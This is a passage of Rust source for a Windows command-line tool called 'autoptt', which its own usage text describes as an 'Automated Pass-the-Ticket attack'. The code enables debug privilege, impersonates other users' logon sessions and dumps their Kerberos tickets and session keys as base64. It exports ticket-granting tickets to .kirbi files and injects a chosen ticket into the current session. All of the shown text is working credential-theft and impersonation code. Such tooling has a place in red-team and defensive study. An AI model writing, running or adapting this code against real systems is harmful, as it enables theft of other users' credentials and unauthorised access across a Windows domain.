                println!("  LogonTime                : {}", logon_time);
                println!("  LogonServer              : {}", logon_server);
                println!("  LogonServerDNSDomain     : {}", dns_domain);
                println!("  UserPrincipalName        : {}", upn);
                println!();
            }
            
            let tickets_offset = mem::size_of::<KERB_QUERY_TKT_CACHE_RESPONSE>();
            let tickets_ptr = (response_ptr as usize + tickets_offset) as *const KERB_TICKET_CACHE_INFO_EX;
            
            for j in 0..ticket_count {
                let ticket_info = &*tickets_ptr.add(j as usize);
                
                let client_name = unicode_string_to_string(&ticket_info.client_name);
                let client_realm = unicode_string_to_string(&ticket_info.client_realm);
                let server_name = unicode_string_to_string(&ticket_info.server_name);
                let server_realm = unicode_string_to_string(&ticket_info.server_realm);
                let start_time = filetime_to_string(ticket_info.start_time);
                let end_time = filetime_to_string(ticket_info.end_time);
                let renew_time = filetime_to_string(ticket_info.renew_time);
                let flags_str = format_ticket_flags(ticket_info.ticket_flags);
                
                let is_tgt = server_name.to_lowercase().contains("krbtgt");
                if is_tgt {
                    tgt_count += 1;
                    add_tgt_to_list(session_luid.low_part, username.clone(), domain.clone(), server_name.clone());
                } else {
                    service_count += 1;
                }
                
                if print_tickets {
                    println!("\n    ServerName               :  {}", server_name);
                    println!("    ServerRealm              :  {}", server_realm);
                    println!("    UserName                 :  {}", client_name);
                    println!("    UserRealm                :  {}", client_realm);
                    println!("    StartTime                :  {}", start_time);
                    println!("    EndTime                  :  {}", end_time);
                    println!("    RenewUntil               :  {}", renew_time);
                    println!("    Flags                    :  {}", flags_str);
                    
                    if let Some((ticket_bytes, session_key_bytes, _)) = request_service_ticket(
                        lsa_handle,
                        auth_pack,
                        *session_luid,
                        &server_name,
                        ticket_info.ticket_flags,
                    ) {
                        if !session_key_bytes.is_empty() {
                            let base64_key = to_base64(&session_key_bytes);
                            println!("    Base64(key)              :  {}", base64_key);
                        } else {
                            println!("    Base64(key)              :  (unavailable)");
                        }
                        
                        println!("    Base64EncodedTicket      :");
                        if !ticket_bytes.is_empty() {
                            let base64_ticket = to_base64(&ticket_bytes);
                            println!("      {}", base64_ticket);
                        } else {
                            println!("      (error retrieving)");
                        }
                    } else {
                        println!("    Base64(key)              :  (unavailable)");
                        println!("    Base64EncodedTicket      :");
                        println!("      (error retrieving)");
                    }
                    
                    println!();
                }
            }
            
            LsaFreeReturnBuffer(response_ptr);
            LsaFreeReturnBuffer(session_data_ptr as PVOID);
        }
        
        if print_tickets {
            println!("{}", "=".repeat(80));
            println!("  SUMMARY");
            println!("{}", "=".repeat(80));
            println!("Total logon sessions analyzed: {}", total_sessions);
            println!("Sessions with Kerberos tickets: {}", sessions_with_tickets);
            println!("Total tickets found: {}", total_tickets);
            println!("  - TGTs: {}", tgt_count);
            println!("  - Service Tickets: {}", service_count);
        }
        
        LsaFreeReturnBuffer(session_list as PVOID);
        LsaDeregisterLogonProcess(lsa_handle);
    }
}


fn export_ticket(logon_id_str: &str) {
    unsafe {
        let target_logon_id = if logon_id_str.starts_with("0x") {
            u32::from_str_radix(&logon_id_str[2..], 16)
        } else {
            u32::from_str_radix(logon_id_str, 16)
        };
        
        let target_logon_id = match target_logon_id {
            Ok(id) => id,
            Err(_) => {
                println!("Error: Invalid LogonId format. Use hex format like 0x79fb3 or 79fb3");
                return;
            }
        };
        
        enable_debug_privilege();
        
        let mut session_count: u32 = 0;
        let mut session_list: *mut LUID = ptr::null_mut();
        let status = LsaEnumerateLogonSessions(&mut session_count, &mut session_list);
        if status != 0 {
            println!("[-] Error enumerating logon sessions");
            return;
        }
        
        let sessions = slice::from_raw_parts(session_list, session_count as usize);
        let mut target_luid: Option<LUID> = None;
        let mut username = String::new();
        let mut domain = String::new();
        
        for session_luid in sessions {
            if session_luid.low_part == target_logon_id {
                target_luid = Some(*session_luid);
                
                let mut session_data_ptr: *mut SECURITY_LOGON_SESSION_DATA = ptr::null_mut();
                if LsaGetLogonSessionData(session_luid, &mut session_data_ptr) == 0 && !session_data_ptr.is_null() {
                    username = unicode_string_to_string(&(*session_data_ptr).user_name);
                    domain = unicode_string_to_string(&(*session_data_ptr).logon_domain);
                    LsaFreeReturnBuffer(session_data_ptr as PVOID);
                }
                break;
            }
        }
        
        LsaFreeReturnBuffer(session_list as PVOID);
        
        if target_luid.is_none() {
            println!("Error: LogonId 0x{:x} not found", target_logon_id);
            return;
        }
        
        let lsa_handle = match get_lsa_handle_with_impersonation() {
            Some(h) => h,
            None => {
                println!("[-] Error obtaining LSA handle");
                return;
            }
        };
        
        let h_imp_token = impersonate_session(target_logon_id);
        let need_revert = if let Some(token) = h_imp_token {
            if ImpersonateLoggedOnUser(token) != 0 {
                true
            } else {
                CloseHandle(token);
                false
            }
        } else {
            false
        };
        
        let pkg_name_str = b"Kerberos\0";
        let pkg_name = LSA_STRING {
            length: (pkg_name_str.len() - 1) as u16,
            maximum_length: pkg_name_str.len() as u16,
            buffer: pkg_name_str.as_ptr() as *mut u8,
        };
        
        let mut auth_pack: u32 = 0;
        let status = LsaLookupAuthenticationPackage(lsa_handle, &pkg_name, &mut auth_pack);
        if status != 0 {
            println!("[-] Error looking up Kerberos package");
            LsaDeregisterLogonProcess(lsa_handle);
            if need_revert {
                RevertToSelf();
                if let Some(token) = h_imp_token {
                    CloseHandle(token);
                }
            }
            return;
        }
        
        let cache_request = KERB_QUERY_TKT_CACHE_REQUEST {
            message_type: KERB_QUERY_TKT_CACHE_MESSAGE,
            logon_id: LUID { low_part: 0, high_part: 0 },
        };
        
        let mut response_ptr: PVOID = ptr::null_mut();
        let mut response_size: u32 = 0;
        let mut protocol_status: NTSTATUS = 0;
        
        let status = LsaCallAuthenticationPackage(
            lsa_handle,
            auth_pack,
            &cache_request as *const _ as PVOID,
            mem::size_of::<KERB_QUERY_TKT_CACHE_REQUEST>() as u32,
            &mut response_ptr,
            &mut response_size,
            &mut protocol_status,
        );
        
        if status != 0 || protocol_status != 0 {
            println!("Error: Error obtaining ticket cache for LogonId 0x{:x}", target_logon_id);
            LsaDeregisterLogonProcess(lsa_handle);
            if need_revert {
                RevertToSelf();
                if let Some(token) = h_imp_token {
                    CloseHandle(token);
                }
            }
            return;
        }
        
        let cache_response = &*(response_ptr as *const KERB_QUERY_TKT_CACHE_RESPONSE);
        let ticket_count = cache_response.count_of_tickets;
        
        let mut target_server: Option<String> = None;
        let mut ticket_flags = 0;
        
        let tickets_offset = mem::size_of::<KERB_QUERY_TKT_CACHE_RESPONSE>();
        let tickets_ptr = (response_ptr as usize + tickets_offset) as *const KERB_TICKET_CACHE_INFO;
        
        for i in 0..ticket_count {
            let ticket = &*tickets_ptr.add(i as usize);
            let server_name = unicode_string_to_string(&ticket.server_name);
            if server_name.to_lowercase().contains("krbtgt") {
                target_server = Some(server_name);
                ticket_flags = ticket.ticket_flags;
                break;
            }
        }
        
        LsaFreeReturnBuffer(response_ptr);
        
        let target_server = match target_server {
            Some(s) => s,
            None => {
                println!("Error: TGT not found for LogonId 0x{:x}", target_logon_id);
                LsaDeregisterLogonProcess(lsa_handle);
                if need_revert {
                    RevertToSelf();
                    if let Some(token) = h_imp_token {
                        CloseHandle(token);
                    }
                }
                return;
            }
        };
        
        if let Some((ticket_bytes, _, _)) = request_service_ticket(
            lsa_handle,
            auth_pack,
            LUID { low_part: 0, high_part: 0 },
            &target_server,
            ticket_flags,
        ) {
            if need_revert {
                RevertToSelf();
                if let Some(token) = h_imp_token {
                    CloseHandle(token);
                }
            }
            
            if ticket_bytes.is_empty() {
                println!("[-] Error extracting ticket data");
                LsaDeregisterLogonProcess(lsa_handle);
                return;
            }
            
            let mut clean_username = username.clone();
            for ch in &['/', '\\', ':', '*', '?', '"', '<', '>', '|', '@', ' ', '$'] {
                clean_username = clean_username.replace(*ch, "_");
            }
            
            let filename = format!("0x{:x}_{}.kirbi", target_logon_id, clean_username);
            
            match File::create(&filename) {
                Ok(mut file) => {
                    if let Err(e) = file.write_all(&ticket_bytes) {
                        println!("[-] Error writing file: {}", e);
                    } else {
                        println!("\n[+] TGT ticket exported successfully");
                        println!("    LogonId: 0x{:x}", target_logon_id);
                        println!("    User: {}\\{}", domain, username);
                        println!("    Server: {}", target_server);
                        println!("    File: {}", filename);
                        println!("    Size: {} bytes", ticket_bytes.len());
                    }
                }
                Err(e) => {
                    println!("[-] Error creating file: {}", e);
                }
            }
        } else {
            if need_revert {
                RevertToSelf();
                if let Some(token) = h_imp_token {
                    CloseHandle(token);
                }
            }
            
            println!("[-] Error retrieving ticket");
        }
        
        LsaDeregisterLogonProcess(lsa_handle);
    }
}


fn pass_the_ticket(filename: &str) {
    unsafe {
        let ticket_data = match std::fs::read(filename) {
            Ok(data) => data,
            Err(e) => {
                println!("Error: Cannot open file {}: {}", filename, e);
                return;
            }
        };
        
        let file_size = ticket_data.len();
        
        if file_size == 0 || file_size > 10 * 1024 * 1024 {
            println!("[-] Invalid file size");
            return;
        }
        
        let mut lsa_handle: HANDLE = 0;
        let status = LsaConnectUntrusted(&mut lsa_handle);
        if status != 0 {
            println!("[-] LsaConnectUntrusted failed: 0x{:08x}", status);
            return;
        }
        
        let pkg_name_str = b"Kerberos\0";
        let pkg_name = LSA_STRING {
            length: (pkg_name_str.len() - 1) as u16,
            maximum_length: pkg_name_str.len() as u16,
            buffer: pkg_name_str.as_ptr() as *mut u8,
        };
        
        let mut auth_pack: u32 = 0;
        let status = LsaLookupAuthenticationPackage(lsa_handle, &pkg_name, &mut auth_pack);
        if status != 0 {
            println!("[-] LsaLookupAuthenticationPackage failed: 0x{:08x}", status);
            LsaDeregisterLogonProcess(lsa_handle);
            return;
        }
        
        let struct_size = mem::size_of::<KERB_SUBMIT_TKT_REQUEST>();
        let submit_size = struct_size + file_size;
        
        let mut submit_buffer = vec![0u8; submit_size];
        
        let submit_req_ptr = submit_buffer.as_mut_ptr() as *mut KERB_SUBMIT_TKT_REQUEST;
        (*submit_req_ptr).message_type = KERB_SUBMIT_TICKET_MESSAGE;
        (*submit_req_ptr).logon_id = LUID { low_part: 0, high_part: 0 };
        (*submit_req_ptr).flags = 0;
        (*submit_req_ptr).key = KERB_CRYPTO_KEY32 {
            key_type: 0,
            length: 0,
            offset: 0,
        };
        (*submit_req_ptr).kerb_cred_size = file_size as u32;
        (*submit_req_ptr).kerb_cred_offset = struct_size as u32;
        
        ptr::copy_nonoverlapping(
            ticket_data.as_ptr(),
            submit_buffer.as_mut_ptr().add(struct_size),
            file_size,
        );
        
        let mut response_ptr: PVOID = ptr::null_mut();
        let mut response_size: u32 = 0;
        let mut protocol_status: NTSTATUS = 0;
        
        let status = LsaCallAuthenticationPackage(
            lsa_handle,
            auth_pack,
            submit_buffer.as_ptr() as PVOID,
            submit_size as u32,
            &mut response_ptr,
            &mut response_size,
            &mut protocol_status,
        );
        
        if status != 0 || protocol_status != 0 {
            println!("\nError: Error importing ticket");
            println!("  Status: 0x{:08X}", status);
            println!("  SubStatus: 0x{:08X}", protocol_status);
            
            match protocol_status as u32 {
                0xC000018B => println!("  Reason: Invalid or malformed ticket"),
                0xC0000225 => println!("  Reason: Domain not found"),
                0xC000005E => println!("  Reason: No valid logon sessions"),
                0xC000000D => println!("  Reason: Invalid parameter"),
                _ => {}
            }
            
            if !response_ptr.is_null() {
                LsaFreeReturnBuffer(response_ptr);
            }
            LsaDeregisterLogonProcess(lsa_handle);
            return;
        }
        
        println!("\n[+] Ticket imported successfully into memory");
        println!("    File: {}", filename);
        println!("    Size: {} bytes", file_size);
        println!("\n[+] Ticket now available in Kerberos cache");
        println!("    You can verify with: autoptt klist");
        
        if !response_ptr.is_null() {
            LsaFreeReturnBuffer(response_ptr);
        }
        LsaDeregisterLogonProcess(lsa_handle);
    }
}


fn auto_export_and_import() {
    unsafe {
        println!("[*] Auto mode: Enumerating tickets and importing selected TGT...");
        print_current_logon_id();
        
        enable_debug_privilege();
        
        enumerate_all_tickets(false);
        
        if G_TGT_LIST.is_empty() {
            println!("\nNo TGTs found on the system.");
            return;
        }
        
        println!("\n{}", "=".repeat(80));
        println!("  AVAILABLE TGTs");
        println!("{}", "=".repeat(80));
        println!("{:<6} {:<12} {:<30} {:<20} Service", "Index", "LogonId", "User", "Domain");
        println!("{} {} {} {} {}", "-".repeat(6), "-".repeat(12), "-".repeat(30), "-".repeat(20), "-".repeat(32));
        
        for (idx, tgt) in G_TGT_LIST.iter().enumerate() {
            println!(
                "{:<6} 0x{:<10x} {:<30} {:<20} {}",
                idx + 1,
                tgt.logon_id,
                tgt.username,
                tgt.domain,
                tgt.service_name
            );
        }
        
        print!("\nChoose TGT to export and import (1-{}), or 0 to cancel: ", G_TGT_LIST.len());
        std::io::stdout().flush().unwrap();
        
        let mut input = String::new();
        std::io::stdin().read_line(&mut input).unwrap();
        
        let choice: usize = match input.trim().parse() {
            Ok(n) => n,
            Err(_) => {
                println!("Cancelled or invalid choice.");
                return;
            }
        };
        
        if choice == 0 || choice > G_TGT_LIST.len() {
            println!("Cancelled or invalid choice.");
            return;
        }
        
        let selected_tgt = &G_TGT_LIST[choice - 1];
        let target_logon_id = selected_tgt.logon_id;
        
        println!("\n[*] Selected: #{} - 0x{:x} ({})", choice, target_logon_id, selected_tgt.username);
        
        let lsa_handle = match get_lsa_handle_with_impersonation() {
            Some(h) => h,
            None => {
                println!("[-] Error obtaining LSA handle");
                return;
            }
        };
        
        let h_imp_token = impersonate_session(target_logon_id);
        let need_revert = if let Some(token) = h_imp_token {
            if ImpersonateLoggedOnUser(token) != 0 {
                true
            } else {
                CloseHandle(token);
                false
            }
        } else {
            false
        };
        
        let pkg_name_str = b"Kerberos\0";
        let pkg_name = LSA_STRING {
            length: (pkg_name_str.len() - 1) as u16,
            maximum_length: pkg_name_str.len() as u16,
            buffer: pkg_name_str.as_ptr() as *mut u8,
        };
        
        let mut auth_pack: u32 = 0;
        let status = LsaLookupAuthenticationPackage(lsa_handle, &pkg_name, &mut auth_pack);
        if status != 0 {
            println!("[-] Error looking up Kerberos package");
            if need_revert {
                RevertToSelf();
                if let Some(token) = h_imp_token {
                    CloseHandle(token);
                }
            }
            LsaDeregisterLogonProcess(lsa_handle);
            return;
        }
        
        let cache_request = KERB_QUERY_TKT_CACHE_REQUEST {
            message_type: KERB_QUERY_TKT_CACHE_MESSAGE,
            logon_id: LUID { low_part: 0, high_part: 0 },
        };
        
        let mut response_ptr: PVOID = ptr::null_mut();
        let mut response_size: u32 = 0;
        let mut protocol_status: NTSTATUS = 0;
        
        let status = LsaCallAuthenticationPackage(
            lsa_handle,
            auth_pack,
            &cache_request as *const _ as PVOID,
            mem::size_of::<KERB_QUERY_TKT_CACHE_REQUEST>() as u32,
            &mut response_ptr,
            &mut response_size,
            &mut protocol_status,
        );
        
        if status != 0 || protocol_status != 0 {
            println!("[-] Error obtaining ticket cache");
            if need_revert {
                RevertToSelf();
                if let Some(token) = h_imp_token {
                    CloseHandle(token);
                }
            }
            LsaDeregisterLogonProcess(lsa_handle);
            return;
        }
        
        let cache_response = &*(response_ptr as *const KERB_QUERY_TKT_CACHE_RESPONSE);
        let ticket_count = cache_response.count_of_tickets;
        
        let mut target_server: Option<String> = None;
        let mut ticket_flags = 0;
        
        let tickets_offset = mem::size_of::<KERB_QUERY_TKT_CACHE_RESPONSE>();
        let tickets_ptr = (response_ptr as usize + tickets_offset) as *const KERB_TICKET_CACHE_INFO;
        
        for i in 0..ticket_count {
            let ticket = &*tickets_ptr.add(i as usize);
            let server_name = unicode_string_to_string(&ticket.server_name);
            if server_name.to_lowercase().contains("krbtgt") {
                target_server = Some(server_name);
                ticket_flags = ticket.ticket_flags;
                break;
            }
        }
        
        LsaFreeReturnBuffer(response_ptr);
        
        let target_server = match target_server {
            Some(s) => s,
            None => {
                println!("[-] TGT not found in cache");
                if need_revert {
                    RevertToSelf();
                    if let Some(token) = h_imp_token {
                        CloseHandle(token);
                    }
                }
                LsaDeregisterLogonProcess(lsa_handle);
                return;
            }
        };
        
        let ticket_bytes = match request_service_ticket(
            lsa_handle,
            auth_pack,
            LUID { low_part: 0, high_part: 0 },
            &target_server,
            ticket_flags,
        ) {
            Some((bytes, _, _)) => bytes,
            None => {
                println!("[-] Error retrieving ticket");
                if need_revert {
                    RevertToSelf();
                    if let Some(token) = h_imp_token {
                        CloseHandle(token);
                    }
                }
                LsaDeregisterLogonProcess(lsa_handle);
                return;
            }
        };
        
        if need_revert {
            RevertToSelf();
            if let Some(token) = h_imp_token {
                CloseHandle(token);
            }
        }
        
        if ticket_bytes.is_empty() {
            println!("[-] Error extracting ticket data");
            LsaDeregisterLogonProcess(lsa_handle);
            return;
        }
        
        println!("[+] Ticket retrieved successfully");
        println!("    Size: {} bytes", ticket_bytes.len());
        
        println!("\n[*] Importing ticket into current session...");
        
        let struct_size = mem::size_of::<KERB_SUBMIT_TKT_REQUEST>();
        let submit_size = struct_size + ticket_bytes.len();
        
        let mut submit_buffer = vec![0u8; submit_size];
        
        let submit_req_ptr = submit_buffer.as_mut_ptr() as *mut KERB_SUBMIT_TKT_REQUEST;
        (*submit_req_ptr).message_type = KERB_SUBMIT_TICKET_MESSAGE;
        (*submit_req_ptr).logon_id = LUID { low_part: 0, high_part: 0 };
        (*submit_req_ptr).flags = 0;
        (*submit_req_ptr).key = KERB_CRYPTO_KEY32 {
            key_type: 0,
            length: 0,
            offset: 0,
        };
        (*submit_req_ptr).kerb_cred_size = ticket_bytes.len() as u32;
        (*submit_req_ptr).kerb_cred_offset = struct_size as u32;
        
        ptr::copy_nonoverlapping(
            ticket_bytes.as_ptr(),
            submit_buffer.as_mut_ptr().add(struct_size),
            ticket_bytes.len(),
        );
        
        let mut response_ptr3: PVOID = ptr::null_mut();
        let mut response_size3: u32 = 0;
        let mut protocol_status3: NTSTATUS = 0;
        
        let status = LsaCallAuthenticationPackage(
            lsa_handle,
            auth_pack,
            submit_buffer.as_ptr() as PVOID,
            submit_size as u32,
            &mut response_ptr3,
            &mut response_size3,
            &mut protocol_status3,
        );
        
        if status != 0 || protocol_status3 != 0 {
            println!("\nError: Error importing ticket");
            println!("  Status: 0x{:08X}", status);
            println!("  SubStatus: 0x{:08X}", protocol_status3);
            
            match protocol_status3 as u32 {
                0xC000018B => println!("  Reason: Invalid or malformed ticket"),
                0xC0000225 => println!("  Reason: Domain not found"),
                0xC000005E => println!("  Reason: No valid logon sessions"),
                0xC000000D => println!("  Reason: Invalid parameter"),
                _ => {}
            }
            
            if !response_ptr3.is_null() {
                LsaFreeReturnBuffer(response_ptr3);
            }
            LsaDeregisterLogonProcess(lsa_handle);
            return;
        }
        
        println!("\n[+] TGT imported successfully into current session");
        println!("    LogonId: 0x{:x}", target_logon_id);
        println!("    User: {}", selected_tgt.username);
        println!("    Service: {}", target_server);
        println!("\n[+] Ticket now available in your Kerberos cache");
        println!("    You can verify with: autoptt klist");
        
        if !response_ptr3.is_null() {
            LsaFreeReturnBuffer(response_ptr3);
        }
        LsaDeregisterLogonProcess(lsa_handle);
    }
}


fn print_banner() {
    println!(r#"
     ___         __       ___  ____________
    / _ | __ __ / /_ ___ / _ \/_  __/_  __/
   / __ |/ // // __// _ \/ ___/ / /   / /   
  /_/ |_|\_,_/ \__/ \___/_/    /_/   /_/    
"#);
}


fn print_usage(program_name: &str) {
    println!("Usage:");
    println!("  {} auto             - Automated Pass-the-Ticket attack", program_name);
    println!("  {} sessions         - List all logon sessions", program_name);
    println!("  {} klist            - List tickets in current session", program_name);
    println!("  {} tickets          - List all tickets from all sessions", program_name);
    println!("  {} export <LogonId> - Export a TGT given the LogonId", program_name);
    println!("  {} ptt <file>       - Import a ticket file given the filename", program_name);
    println!();
}


fn main() {
    let args: Vec<String> = env::args().collect();
    let program_name = args.get(0).map(|s| s.as_str()).unwrap_or("autoptt");

    if args.len() > 1 {
        let command = args[1].to_lowercase();
        
        match command.as_str() {
            "sessions" => {
                print_current_logon_id();
                enumerate_logon_sessions();
            }
            "klist" => {
                print_current_logon_id();
                enumerate_my_tickets();
            }
            "tickets" => {
                print_current_logon_id();
                enumerate_all_tickets(true);
            }
            "export" => {
                if args.len() > 2 {
                    export_ticket(&args[2]);
                } else {
                    println!("Error: export requires LogonId parameter");
                    print_usage(program_name);
                }
            }
            "ptt" => {
                if args.len() > 2 {
                    pass_the_ticket(&args[2]);
                } else {
                    println!("Error: ptt requires filename parameter");
                    print_usage(program_name);
                }
            }
            "auto" => {
                auto_export_and_import();
            }
            _ => {
                print_banner();
                print_usage(program_name);
            }
        }
    } else {
        print_banner();
        print_usage(program_name);
    }
}